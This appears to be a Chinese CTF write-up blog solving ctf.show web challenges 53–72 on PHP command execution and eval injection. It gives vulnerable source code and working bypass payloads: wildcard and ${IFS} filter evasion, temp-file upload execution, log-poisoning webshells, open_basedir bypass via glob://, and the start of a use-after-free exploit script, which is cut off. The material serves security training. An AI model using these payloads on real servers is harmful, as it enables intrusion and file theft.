<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>payload：/?c=nl$&#123;IFS&#125;fl\ag.php</code></p>
<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"><span class="comment">//“.*c.*a.*t.*”匹配有cat的字符串，只要字符串有这三个字母且顺序不变，例如“XcXXaXXtX”</span></span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>cat、tac、nl、more、less、head、tail</code>读取文件内容的命令全部被过滤了，这里有三种解法。</p>
<p>第一种，<code>paste</code>命令，合并文件并输出合并后文件内容</p>
<p><code>payload：/?c=paste$&#123;IFS&#125;fl??.php</code></p>
<p>第二种，<code>mv</code>命令，将文件改名，并直接访问改名后文件</p>
<p><code>payload：/?c=mv$&#123;IFS&#125;f???.php$&#123;IFS&#125;x.txt</code></p>
<p>第三种，可以理解为当前目录运行<code>cat</code>命令实际上运行的也是<code>bin/cat</code>，而通配符不会帮你去找到<code>bin</code>下面的<code>cat</code><br>只会在当前目录寻找能通配的文件，所以用通配符运行时必须给出路径</p>
<p><code>payload：/?c=/bin/?at$&#123;IFS&#125;f???.php</code></p>
<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了字母，但没过滤数字，这一题与下一题都可以用无字母数字的RCE，但翻看其他师傅的做题记录时，看到一个相比较前者，更方便独特的方法，就是通过匹配<code>/bin</code>下存在的命令进行读取flag，这方法前面也用过，但实在没想到用到base64这个命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：/?c=/???/????<span class="number">64</span> ????.???                     也就是?c=/bin/base64 flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>做这一题，一定要深入研读一下<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">p神的这篇文章</a>，这里最主要的两点：</p>
<p>1、shell利用<code>.</code>执行脚本，用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
<p>2、我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。然后我们可以用通配符去匹配执行这个文件，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，但干扰我们的文件的所有文件名都是小写，只有PHP生成的临时文件包含大写字母。所以我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间。</p>
<p>明白原理之后，就开始操作，首先构造一个post上传文件的数据包，</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://e4098f9c-7071-475c-9e45-5d143c1f1082.challenge.ctf.show:8080/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传文件，然后抓包，构造poc执行命令：<code>?c=.%20/???/????????[@-[]</code></p>
<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20210714155357075.png" alt="image-20210714155357075"></p>
<p>接下来更改上传文件中的shell命令就行，每次上传的文件不一定有大写的文件名，有时需要多上传几次。</p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个通配符被过滤了，所以只能<code>$c=&quot;36&quot;</code>，但数字又被过滤了，这里想办法构造36，因为没过滤<code>$</code>，所以可以用到以下方法：</p>
<blockquote>
<p><code>$(())</code> 代表做一次运算，因为里面为空，也表示值为0<br><code>$((~$(())))</code> 对0作取反运算，值为-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1，也就是(-1)+(-1)为-2，所以值为-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code> 再对-2做一次取反得到1，所以值为1</p>
</blockquote>
<blockquote>
<p><code>$&#123;_&#125;</code>:代表上一次命令执行的结果，之前没有命令返回或者执行,结果应该是空,与<code>&quot;&quot;</code>等价<br><code>$(())</code>: 做运算</p>
</blockquote>
<p>36取反为-37，所以很容易构造，中间有37个<code>$((~$(())))</code>相加，<code>paylaod：/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></p>
<h2 id="29-57总结"><a href="#29-57总结" class="headerlink" title="29-57总结"></a>29-57总结</h2><blockquote>
<p><strong>过滤括号</strong></p>
<p><code>include</code>+二次传参<!--32--></p>
<p><strong>过滤引号：</strong><!--40--></p>
<p>说明函数里不能加参数了，用无参数函数读取文件</p>
<p><strong>无字母数字：</strong></p>
<p>1.位运算符没被过滤，采用位运算构造所需字符<!--41--></p>
<p>2.通配符+<code>/bin</code>下命令<!--55--></p>
<p>3.PHP5+shell(<code>. /???/????????[@-[]</code>)<!--56--></p>
<p>4.shell里<code>$(())</code><!--57--></p>
</blockquote>
<h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序执行函数被全部过滤，不能用webshell执行命令，那就用php的函数读取文件，</p>
<p><code>payload：c=echo file_get_contents(&quot;flag.php&quot;);</code>；</p>
<p>换个姿势，<code>c=rename(&#39;flag.php&#39;,&#39;1.txt&#39;);</code>，然后直接访问<code>/1.txt</code>就行。</p>
<h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码与上一题一样没有变化，但上一题的<code>file_get_contents()</code>函数被禁用了，换个姿势，<code>c=include($_GET[1]);</code></p>
<p><code>/?1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><p>代码无变化，继续换姿势<code>c=show_source(&quot;flag.php&quot;);</code></p>
<h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><p>代码无变化，换姿势<code>c=highlight_file(&#39;flag.php&#39;);</code></p>
<h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><p>代码无变化，换一个姿势解题，这里尝试用日志包含拿shell，首先在请求头的<code>User-Agent</code>写入一句话木马，<code>c=include($_GET[1]);&amp;a=echo &#39;abcde&#39;</code>，<code>/?1=/var/log/nginx/access.log</code>，成功拿到shell，接下就尝试写命令，后来想到程序执行函数都被过滤了，好像拿到这个shell也不能写命令，不过可以蚁剑直连。后面再想想，源码里好像有一个shell，可以直接蚁剑连接getshell。但不知道为什么蚁剑连进去，看不到文件里的内容。</p>
<h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><p>代码没变，继续用<code>show_source()</code>函数，换种姿势<code>c=include(&#39;flag.php&#39;);echo $flag;</code>，<code>$flag</code>是<code>flag.php</code>文件中的变量，要先将文件包含进去，才能读取文件中的变量</p>
<h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><p>代码没变，<code>show_source()</code>函数还没被禁用，可以继续用，换姿势，<code>c=include(&#39;flag.php&#39;);print_r(get_defined_vars());</code>，这里用到的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars() — 返回由所有已定义变量所组成的数组</span><br><span class="line">此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure>

<p>思路其实跟上一题差不多，先包含文件，再读取文件中的变量值。</p>
<h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><p>代码没变，还可以用<code>show_source()</code></p>
<h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p>代码没变，<code>show_source()</code>终于被禁了，<code>highlight_file()</code>仍然可用，但flag不在<code>flag.php</code>了，查找新文件的路径<code>c=print_r(scandir(&#39;/&#39;));</code>，根目录下找到<code>flag.txt</code>，<code>payload：c=highlight_file(&#39;/flag.txt&#39;);</code></p>
<h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>代码不变，<code>print_r()</code>被禁了，替换成<code>var_dump()</code>，同样在根目录下找到<code>flag.txt</code>，payload同上一题</p>
<h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p>打卡页面，直接显示<code>highlight_file()</code>被禁用，我们还可以用<code>readgzfile()</code>，<code>c=readgzfile(&#39;/flag.txt&#39;);</code>。其它方法<code>c=include(&#39;/flag.txt&#39;);</code>，这里直接包含就行，因为不是php代码，所以文件包含把txt当html直接输出</p>
<h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>这里查目录文件时，禁用了<code>var_dump()</code>，同样还有<code>var_export()</code>可用，上题两个payload都可以用</p>
<h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p><code>var_export()</code>还可以用，文件名和路径没变，上题两个payload都还可以用</p>
<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><p>如之前一样进行操作，发现回显变成了一堆问号，下载附件，查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);<span class="comment">//会将字母数字替换成?</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一开始想当然去绕过无字母数字，利用位运算，参考web41，尝试发现不行，看代码，思考到只要<code>eval()</code>后面的语句不执行，就可以读取到flag，所以<code>c=include(&#39;/flag.txt&#39;);exit();</code></p>
<h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>附件的php源码无变化，尝试上一题的flag，回显发现读取这个文件失败，看来应该又改了文件名，这里用<code>c=var_export(scandir(&#39;/&#39;));exit();</code>查看根目录，然后就看到这一句“open_basedir restriction in effect.”，这里用<code>open_basedir</code>限制了目录，果然如果查看当前目录是可以的，说明它限制为当前目录，</p>
<blockquote>
<p>open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</p>
</blockquote>
<p><code>open_basedir</code>的设置对<code>system</code>等命令执行函数是无效的，可以使用命令执行函数来访问限制目录。但可惜这里都被禁用了。这里就要用到glob伪协议，</p>
<blockquote>
<p>glob://是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议， 功能是查找匹配的文件路径模式。由于它在筛选目录时是不受open_basedir的制约的，所以我们可以利用它来绕过限制</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a &#x3D; &quot;glob:&#x2F;&#x2F;&#x2F;*&quot;;&#x2F;&#x2F;查找根目录下所有文件</span><br><span class="line">  if ( $b &#x3D; opendir($a) ) &#123;</span><br><span class="line">    while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;</span><br><span class="line">      echo $file.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">  &#125;;exit();</span><br><span class="line">&#x2F;&#x2F;bin dev etc flag0.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>

<p>这里有两种写法，成功找到<code>flag0.txt</code>，但还是没有办法读取这个文件，这要利用uaf的脚本进行命令执行，脚本如下(urlencode)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;function ctfshow($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace &#x3D; (new Exception)-&gt;getTrace();</span><br><span class="line">            if(!isset($backtrace[1][&#39;args&#39;])) &#123;</span><br><span class="line">                $backtrace &#x3D; debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper 